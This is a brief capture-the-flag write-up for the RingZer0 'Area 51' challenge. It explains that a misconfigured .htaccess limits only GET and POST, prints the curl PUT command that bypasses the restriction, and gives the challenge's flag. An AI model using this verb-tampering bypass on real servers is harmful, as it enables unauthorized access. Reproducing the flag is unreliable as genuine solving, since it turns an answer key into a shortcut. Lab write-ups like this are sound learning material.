# Area 51
An unsecure .htaccess file doesn't account for requests outside GET and POST. We can send a PUT request with curl to obtain the flag.
```
curl --cookie "PHPSESSID=YOUR_SESSION_ID_HERE" -X PUT https://ringzer0ctf.com/challenges/48 -o flag.html
```
Flag: FLAG-w4KRr557y626izv567758O52
